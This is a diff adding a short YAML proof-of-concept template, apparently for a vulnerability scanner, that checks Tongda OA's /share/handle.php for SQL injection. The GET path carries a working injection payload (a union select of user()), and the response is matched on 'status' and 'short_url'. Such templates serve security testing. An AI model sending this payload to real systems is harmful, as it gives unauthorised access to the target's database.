@@ -1,0 +1,10 @@
+name: poc-yaml-通达OA-sql
+description: "sql注入"
+method: GET
+path:
+  - /share/handle.php?_GET[module]=1%27+and+1={`=%27`+1}+and+1=0+union+select+(select/**/user())--+%27
+expression:
+  status: 200
+  body_all:
+    - "status"
+    - "short_url"
